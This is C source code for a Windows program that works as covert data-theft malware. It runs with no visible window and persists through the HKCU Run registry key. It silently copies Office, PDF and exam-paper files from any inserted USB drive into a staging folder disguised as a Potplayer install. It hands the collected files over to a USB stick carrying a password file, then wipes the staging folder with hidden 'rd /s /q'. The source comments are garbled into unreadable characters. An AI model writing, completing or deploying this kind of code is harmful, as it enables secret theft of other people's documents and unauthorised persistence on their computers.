#define _CRT_SECURE_NO_WARNINGS
#ifdef _MSC_VER
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif


#include <stdio.h>
#include<io.h>
#include <stdarg.h>
#include <Windows.h>
#include <winioctl.h>
#include"direct.h"
int getDirName(TCHAR diskName[26][10]);
int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10], int diskNumber);
void convertsCharToTCHAR(char* strUsr, TCHAR* Name);
void copyFile(const TCHAR* dirName);
void findFolder(const TCHAR* dirName, BOOL recursion);
void CreateFolder(const char* folderName);
void RemoveFolder(const char* folderName);
int findMyUDisk(TCHAR* removebleDiskName);
char* GetFilename(char* p);
void setComputerStart(char* argv);
void ProcessStrings(char* diskName, char* Process);
BOOL isUsbDrv(char* path);
BOOL UpPrivilegeValue();
BOOL DetermineFileName(char* fileName, int num, ...);

TCHAR* CopiedFileAddress = "D:\\Program Files\\Potplayer";

int main(int argc, TCHAR* argv[])
{

	while (1)
	{
		CreateFolder("D:\\Program Files");
		CreateFolder(CopiedFileAddress);
		int jump = 0;
		UpPrivilegeValue();//����Ȩ��
		setComputerStart(*argv);//���ÿ�������
		TCHAR diskName[26][10] = { 0 };
		TCHAR removebleDiskName[26][10] = { 0 };
		int diskNumber = 0;
		int removebleNumber = 0;
		diskNumber = getDirName(diskName);
		removebleNumber = getAllDirRemoveble(diskName, removebleDiskName, diskNumber);
		if (removebleNumber != 0)
		{
			for (int i = 0; i < removebleNumber; i++)
			{
				copyFile(removebleDiskName[i]);
				findFolder(removebleDiskName[i], FALSE);
				findMyUDisk(removebleDiskName[i]);
				for (int i = 0; i < 3 && jump != 0; i++)
					jump = _chdir("C:\\");
				printf("\n");
				Sleep(10000);
			}
		}
	}
	return 0;
}

void ProcessStrings(char* diskName, char* Process)
{
	sprintf(Process, "%s%s", "\\\\.\\", diskName);
	int textLong = (int)strlen(Process);
	for (int i = textLong-1; i < textLong; i++)
		Process[i] = '\0';
}

BOOL UpPrivilegeValue()
{
	//OpenProcessToken()���������������������ķ�������
	HANDLE hToken = NULL;
	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		return FALSE;
	}
	//LookupPrivilegeValue()�����鿴ϵͳȨ�޵���Ȩֵ
	LUID luid;
	if (FALSE == LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	//����Ȩ������
	TOKEN_PRIVILEGES Tok;
	Tok.PrivilegeCount = 1;
	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Tok.Privileges[0].Luid = luid;
	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), NULL, NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


int getDirName(TCHAR diskName[26][10])
{
	TCHAR wDrivesName[256];
	GetLogicalDriveStrings(256, wDrivesName);
	TCHAR* p = wDrivesName;
	int i = 0;
	for (i=0; i < 26 && *p != 0; i++)
	{
		wsprintf(diskName[i], TEXT("%s"), p);
		p += (lstrlen(p) + 1);
	}
	return i;
}


BOOL isUsbDrv(char* path)
{
	//#include <winioctl.h>
	//path: "\\\\?\\F:"
#define IOCTL_STORAGE_QUERY_PROPERTY   CTL_CODE(IOCTL_STORAGE_BASE, 0x0500, METHOD_BUFFERED, FILE_ANY_ACCESS)
	typedef  struct _STORAGE_DEVICE_DESCRIPTOR
	{
		DWORD Version;                DWORD Size;
		BYTE  DeviceType;             BYTE  DeviceTypeModifier;
		BOOLEAN RemovableMedia;       BOOLEAN CommandQueueing;
		DWORD VendorIdOffset;         DWORD ProductIdOffset;
		DWORD ProductRevisionOffset;  DWORD SerialNumberOffset;
		STORAGE_BUS_TYPE BusType;     DWORD RawPropertiesLength;
		BYTE  RawDeviceProperties[1];
	} STORAGE_DEVICE_DESCRIPTOR;

	HANDLE hDisk;
	STORAGE_DEVICE_DESCRIPTOR devDesc;
	DWORD query[3] = { 0,0,1588180 };

	DWORD cbBytesReturned;

	hDisk = CreateFile(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDisk == INVALID_HANDLE_VALUE)
		return FALSE;

	if (DeviceIoControl(hDisk, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query),
		&devDesc, sizeof(devDesc), &cbBytesReturned, NULL))
	{
		if (devDesc.BusType == BusTypeUsb)
		{
			CloseHandle(hDisk);
			return TRUE;
		}
	}
	return FALSE;
}

int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10],int diskNumber)
{
	int removebleDiskNumber = 0;
	char temp[15] = { 0 };
	for (int i = 0; i < diskNumber; i++)
	{
		for (int i = 0; i < 15; i++)
			temp[i] = '\0';
		ProcessStrings(diskName[i], temp);
		if (GetDriveType(diskName[i]) == DRIVE_REMOVABLE || isUsbDrv(temp)==1)
		{
			wsprintf(removebleDiskName[removebleDiskNumber], TEXT("%s"), diskName[i]);
			removebleDiskNumber++;
		}
	}
	return removebleDiskNumber;
}

void convertsCharToTCHAR(char *strUsr,TCHAR *Name)
{
#ifdef UNICODE
	MultiByteToWideChar(CP_ACP, 0, strUsr, -1, Name, 100);
#else
	strcpy(Name, strUsr);
#endif
}

void findFolder(const TCHAR* dirName,BOOL recursion)
{
	TCHAR fileNameAll[MAX_PATH] = { 0 };
	intptr_t file;
	struct _finddata_t find;

	if (_chdir(dirName) == -1)
	{
		return;
	}
	if ((file = _findfirst("*.*", &find)) == -1L)
	{
		return;
	}

	if (strstr(find.name, ".") == NULL && find.attrib== _A_SUBDIR)//�ж��Ƿ�Ϊ�ļ���
	{
		if (recursion == 0)
			wsprintf(fileNameAll, TEXT("%s%s"), dirName, find.name);
		else
			wsprintf(fileNameAll, TEXT("%s\\%s"), dirName, find.name);
		copyFile(fileNameAll);
		findFolder(fileNameAll,TRUE);
	}

	while (_findnext(file, &find) == 0)
	{
		if (strcmp(find.name, ".") == 0 || strcmp(find.name, "..") == 0)
			continue;

		for (int i = 0; i < sizeof(fileNameAll); i++)
		{
			fileNameAll[i] = '\0';
		}
		if (strstr(find.name, ".") == NULL && find.attrib == _A_SUBDIR)
		{
			if (strstr(find.name, ".") == NULL)
			{
				if (recursion == 0)
					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s%s"), dirName, find.name);
				else
					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s\\%s"), dirName, find.name);

				copyFile(fileNameAll);
				findFolder(fileNameAll,TRUE);
			}
		}

	}
	_findclose(file);
}

void copyFile(const TCHAR* dirName)
{
	TCHAR fileName[MAX_PATH] = { 0 };
	TCHAR copyFileName[MAX_PATH] = { 0 };
	intptr_t file;
	struct _finddata_t find;

	if (_chdir(dirName) == -1)
	{
		return;
	}
	if ((file = _findfirst("*.*", &find)) == -1L)
	{
		return;
	}

	convertsCharToTCHAR(find.name, fileName);
	if (DetermineFileName(fileName, 6, ".xlsx", "doc", "pdf", "ppt", "�Ծ�", "��"))
	{
		wsprintf(copyFileName, TEXT("%s\\%s"),CopiedFileAddress, fileName);

		TCHAR szCommand[1000] = { 0 };
		sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
		if (WinExec(szCommand, SW_HIDE) <= 31)
			return;
	}

	while (_findnext(file, &find) == 0)
	{
		if (strcmp(find.name, ".") == 0 || strcmp(find.name, "..") == 0)
					continue;
			convertsCharToTCHAR(find.name, fileName);

			if (DetermineFileName(fileName, 6, ".xlsx", "doc", "pdf", "ppt", "�Ծ�", "��"))
			{
				wsprintf(copyFileName, TEXT("%s\\%s"), CopiedFileAddress, fileName);

				TCHAR szCommand[1000] = { 0 };
				sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
				if (WinExec(szCommand, SW_HIDE) <= 31)
					return;
			}
	}
	_findclose(file);

	return;
}

void CreateFolder(const char* folderName)
{
	// �ļ��в������򴴽��ļ���
	if (_access(folderName, 0) == -1)
	{
		_mkdir(folderName);
	}
}
void RemoveFolder(const char* folderName)
{
	if (_access(folderName, 0) == 0)
	{
		TCHAR szCommand[1000] = { 0 };
		sprintf(szCommand, "CMD /C rd /s /q %s", folderName);
		if (WinExec(szCommand, SW_HIDE) <= 31)
			return;
	}
}
int findMyUDisk(TCHAR *removebleDiskName)
{
	FILE* fp;
	char* fileName = (char*)malloc(sizeof(char) * 200);
	int passWord = 54188220;
	int getword = 0;
	if (fileName != NULL)
	{
		wsprintf(fileName, TEXT("%s%s"), removebleDiskName, "mamsitear.txt");
		if ((fp = fopen(fileName, "r")) == NULL)
		{
			free(fileName);
			fileName = NULL;
			return -1;
		}

		fscanf_s(fp, "%d", &getword);
		fclose(fp);

		free(fileName);
		fileName = NULL;//�ͷ��ڴ�
		if (getword == passWord)
		{
			TCHAR copyFloderName[100] = { 0 };
			TCHAR szCommand[MAX_PATH*2] = { 0 };
			sprintf(copyFloderName, "%s%s", removebleDiskName, "Code");
			CreateFolder(copyFloderName);
			sprintf(szCommand, "CMD /C Xcopy /V /Y \"%s\" \"%s\"", CopiedFileAddress, copyFloderName);
			if (WinExec(szCommand, SW_HIDE) <= 31)
			{
				return -1;
			}
			RemoveFolder(CopiedFileAddress);
			CreateFolder(CopiedFileAddress);//����ļ����������ļ�
			return 1;
		}
	}
	return 0;
}

void ComputerStart(char* pathName)
{
	//�ҵ�ϵͳ�������� 
	const char* szSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hKey;

	//��ע��������� 
	int k = RegOpenKeyExA(HKEY_CURRENT_USER, szSubKey, 0, KEY_ALL_ACCESS, &hKey);
	if (k == ERROR_SUCCESS)
	{
		//���һ����Key,������ֵ��MyStartΪ���������ƣ��Զ������ã�
		RegSetValueEx(hKey, "MyStart", 0, REG_SZ, (BYTE*)pathName, (DWORD)strlen(pathName));
		//�ر�ע���
		RegCloseKey(hKey);
		//printf("���óɹ�\n");
	}
	else
	{
		//printf("����ʧ��  error:%d\n", k);
	}
}


void setComputerStart(char* argv)
{
	char pathName[MAX_PATH] = { 0 };//�ļ��������260���ַ�  MAX_PATH  260
	GetCurrentDirectory(MAX_PATH, pathName);//�����ַ���Ϊ���ֽ��ַ���  ��ȡ��ǰ�ļ�·��

	sprintf(pathName, "%s\\", pathName);
	strcat(pathName, GetFilename(argv));//�ҵ���Ҫ�����������ĳ���

	ComputerStart(pathName);
}

char* GetFilename(char* p)
{
	int x = (int)strlen(p);
	char ch = '\\';
	char* q = strrchr(p, ch) + 1;

	return q;
}

BOOL DetermineFileName(char *fileName,int num, ...)
{
	va_list valist;
	/* Ϊ num ��������ʼ�� valist */
	va_start(valist, num);
	
	/* �������и��� valist �Ĳ��� */
	for (int i = 0; i < num; i++)
	{
		char* a = va_arg(valist, char*);
		if (strstr(fileName, a) != NULL)
			return TRUE;
	}
	/* ����Ϊ valist �������ڴ� */
	va_end(valist);

	return FALSE;
}